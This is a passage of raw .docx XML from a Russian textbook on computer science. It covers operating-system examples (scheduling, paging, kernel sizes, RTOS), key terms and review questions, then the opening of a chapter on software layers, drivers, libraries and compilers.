      </w:pPr>
      <w:r>
        <w:t>**Глава 5 (Алгоритмы):** планировщик процессов в ОС использует алгоритмы планирования (Round Robin, Priority Scheduling).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7 (Базы данных):** СУБД работают поверх ОС, используют её API для работы с файлами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9 (Информационная безопасность):** ОС обеспечивает защиту: права доступа, изоляцию процессов, шифрование дисков.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры для понимания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Планирование процессов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> У тебя 4-ядерный процессор. Запущено 10 процессов. ОС использует алгоритм </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Round Robin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (циклическое планирование) с квантом времени 20 мс. Сколько времени каждый процесс ждёт своей очереди?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4 ядра могут выполнять 4 процесса одновременно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый процесс работает 20 мс, затем ОС переключается на следующий.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Первые 4 процесса выполняются: 0-20 мс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Следующие 4: 20-40 мс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Последние 2: 40-60 мс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс №5 ждёт: 20 мс (пока выполняются 1-4, затем его очередь).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс №10 ждёт: 40 мс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В многозадачной системе процессы делят время процессора. Чем больше процессов — тем дольше ожидание.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Виртуальная память</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Система с 8 GB RAM. Запущены программы, использующие 10 GB. Размер страницы 4 KB. Сколько страниц нужно выгрузить на диск?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требуется: 10 GB = 10 × 2³⁰ байт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Физическая память: 8 GB = 8 × 2³⁰ байт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не хватает: 2 GB = 2 × 2³⁰ байт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер страницы: 4 KB = 4 × 2¹⁰ байт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество страниц для выгрузки: (2 × 2³⁰) / (4 × 2¹⁰) = 2 × 2²⁰ / 4 = 524,288 страниц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ОС выгружает на диск полмиллиона страниц. Если программа обращается к выгруженной странице, происходит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>page fault</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (промах страницы), ОС подгружает её с диска. Это медленно (миллисекунды вместо наносекунд), поэтому систему тормозит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Размер ядра ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сравнить размеры ядер разных ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| ОС               | Размер ядра (строки кода) | Архитектура ядра |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------------|--------------------------|------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Linux 6.6 (2025) | ~30,000,000              | Монолитное       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Windows NT       | ~50,000,000 (оценка)     | Гибридное        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| macOS XNU        | ~10,000,000              | Гибридное        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Minix 3          | ~20,000                  | Микроядро        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| FreeRTOS         | ~10,000                  | Микроядро        |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Микроядерные ОС в 1000+ раз компактнее монолитных. Но монолитные — производительнее. Компромисс: надёжность vs скорость.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: RTOS в авионике</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Самолёт Boeing 787 использует VxWorks (RTOS). Критичная задача: обработка данных от датчика высоты. Максимальная допустимая задержка: 5 мс. Обычная ОС (Windows) имеет задержку до 100 мс. Почему нельзя использовать Windows?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>RTOS гарантирует, что задача выполнится за заданное время (детерминированность). Windows — ОС общего назначения, она может отложить обработку датчика на 100 мс, если занята обновлением или антивирусом. Для самолёта это недопустимо: задержка в 100 мс при критической ситуации = катастрофа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для задач реального времени нужны специализированные ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Операционная система (ОС)** — комплекс программ, управляющих аппаратными ресурсами и предоставляющих сервисы для пользовательских приложений.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Процесс** — программа в процессе выполнения (с выделенной памятью и состоянием).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Многозадачность (Multitasking)** — одновременное выполнение нескольких процессов (вытесняющая или невытесняющая).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Планирование (Scheduling)** — алгоритм распределения времени процессора между процессами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Виртуальная память (Virtual Memory)** — механизм, позволяющий процессам использовать больше памяти, чем физически доступно (через подкачку на диск).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Страничная организация памяти (Paging)** — разделение памяти на блоки фиксированного размера (страницы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловая система (File System)** — способ организации данных на диске (FAT32, NTFS, ext4, APFS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Драйвер (Driver)** — программа для управления конкретным устройством.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ядро (Kernel)** — центральная часть ОС, работающая в привилегированном режиме (монолитное, микроядро, гибридное).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CLI (Command Line Interface)** — командная строка (текстовый интерфейс).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GUI (Graphical User Interface)** — графический интерфейс (окна, кнопки).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RTOS (Real-Time OS)** — ОС реального времени, гарантирующая выполнение задач за заданное время.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дистрибутив (Distribution)** — вариант Linux с набором программ и настроек (Ubuntu, Debian, Arch).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системный вызов (System Call)** — запрос программы к ядру ОС для выполнения привилегированной операции (чтение файла, выделение памяти).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Назовите пять основных функций операционной системы. Объясните, почему без виртуальной памяти современные ОС не могли бы работать с большим количеством процессов одновременно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** У тебя 16 GB RAM, запущено 10 программ, каждая использует 2 GB. Физической памяти не хватает. ОС использует подкачку на SSD (скорость чтения 3 GB/с). Программа обращается к данным, которые были выгружены на диск. Сколько времени займёт подгрузка одной страницы размером 4 KB? Сравни с обращением к RAM (задержка 10 нс).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнение:** В чём принципиальное отличие монолитного ядра (Linux) от микроядра (Minix)? Почему Linux доминирует на серверах, несмотря на то, что микроядра теоретически надёжнее?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Классификация:** Объясните разницу между ОС общего назначения (Windows) и RTOS (FreeRTOS). Приведите пример задачи, где RTOS обязательна, и задачи, где она не нужна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ:** Почему 96% веб-серверов работают на Linux, а не на Windows Server? Какие преимущества Linux для серверов критичны? (Подсказка: лицензии, стабильность, ресурсы, безопасность.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Операционная система — это менеджер компьютера, который управляет всеми ресурсами и не даёт программам убить друг друга. Без ОС компьютер — просто железка. ОС бывают разные: для серверов (Linux), для десктопов (Windows, macOS), для смартфонов (Android, iOS), для встраиваемых систем (Embedded Linux, FreeRTOS). Архитектура ядра может быть монолитной (быстро, но рискованно), микроядром (надёжно, но медленно), или гибридом (компромисс).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Следующая глава (3.2) — уровни программного обеспечения: как ОС взаимодействует с прикладными программами и зачем нужны драйверы, библиотеки, API.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 3.2: Уровни программного обеспечения. Сервисное и прикладное ПО</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В предыдущей главе (3.1) мы разобрались, что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>операционная система</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это менеджер, который управляет железом и не даёт процессам убить друг друга. Но ОС — это только фундамент. На ней строится многоэтажный небоскрёб из программ: драйверы, библиотеки, компиляторы, IDE, игры, браузеры, антивирусы, и даже калькулятор, который ты открываешь раз в год на экзамене.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Вся эта куча софта организована в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>иерархию уровней</w:t>
      </w:r>
      <w:r>
        <w:t>. Нижний уровень (железо) ничего не знает о верхнем (твой браузер), а верхний не хочет лезть в детали работы процессора. Между ними — прослойки: драйверы, библиотеки, API, middleware. Это как слоёный пирог: каждый слой имеет свою задачу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие уровни ПО существуют (от железа до игр)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое **сервисное ПО** (библиотеки, компиляторы, API)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое **прикладное ПО** (программы, которыми ты пользуешься каждый день)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Почему системный программист смотрит на прикладного сверху вниз (но зарабатывает не сильно больше)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2.1. Иерархия уровней программного обеспечения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Программное обеспечение можно представить как слоёный пирог (или бургер, если ты голоден). Каждый уровень опирается на предыдущий и предоставляет сервисы следующему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Четыре основных уровня</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Аппаратный уровень (Hardware Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Физическое железо — процессор, память, диски, сетевые карты, видеокарты. Это нулевой уровень, без него ничего не работает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компоненты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CPU** (процессор) — вычисляет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RAM** (оперативная память) — хранит данные для быстрого доступа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Диски** (HDD, SSD, NVMe) — долговременное хранение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GPU** (видеокарта) — рисует картинки и майнит крипту</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Периферия** (клавиатура, мышь, принтеры, веб-камеры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прослойка:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BIOS/UEFI</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — прошивка, которая запускается при включении компьютера. Она инициализирует железо и передаёт управление ОС. BIOS — древний (1980-е), UEFI — современная замена (поддержка дисков &gt;2 TB, GUI, безопасность Secure Boot).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Нажал кнопку включения → UEFI проверяет железо → загружает загрузчик ОС (GRUB / Windows Boot Manager) → запускается ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Системный уровень (System Software Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Программы, которые управляют железом и предоставляют базовые сервисы. Без них компьютер — кирпич.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные компоненты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a) Операционная система (ОС)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ядро (kernel) — управляет процессами, памятью, файлами, устройствами (глава 3.1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системные утилиты — программы для управления системой (ps, top, taskmgr.exe).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>б) Драйверы (Drivers)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программы для управления конкретным устройством.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер видеокарты NVIDIA GeForce RTX 4090 переводит команды DirectX/OpenGL в инструкции для GPU.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер принтера знает, как отправить документ на печать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в) Системные утилиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дефрагментация диска** (для HDD, на SSD бесполезна).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Диспетчер задач** (Task Manager в Windows, `top` / `htop` в Linux).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловые менеджеры** (Explorer в Windows, Nautilus в Linux).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архиваторы** (глава 1.12): WinRAR, 7-Zip, gzip, tar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Антивирусы** — защита от зловредов (хотя Windows Defender уже неплохой).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто пишет:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> системные программисты. Языки: C, C++, Assembly. Ошибка в драйвере = Blue Screen of Death.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с главой 3.1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ОС — это ядро системного уровня. Драйверы и утилиты работают в связке с ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Сервисный уровень (Service Software Layer / Middleware)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Промежуточный слой между системным и прикладным ПО. Предоставляет инструменты для разработки и запуска программ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные компоненты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a) Библиотеки и API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**API (Application Programming Interface)** — набор функций для взаимодействия с ОС или другими программами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**libc** (стандартная библиотека C) — функции `printf()`, `malloc()`, работа с файлами. Используется почти всеми программами в Linux.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WinAPI** — API Windows для создания окон, работы с файлами, сетью.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**.NET Framework / .NET Core** — платформа для разработки на C#, F#, Visual Basic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Графические библиотеки:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**OpenGL** — кросс-платформенный API для 3D-графики (игры, CAD).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DirectX** — API Windows для игр (DirectX 12 в современных играх).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Vulkan** — низкоуровневый API для максимальной производительности (Doom Eternal, Cyberpunk 2077).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>б) Компиляторы и интерпретаторы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Преобразуют код на языке программирования в машинный код (подробнее в главе 6.2).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компиляторы:** GCC (C/C++), Clang (C/C++/Objective-C), rustc (Rust), javac (Java).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интерпретаторы:** Python, JavaScript (V8 в Chrome), Ruby.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
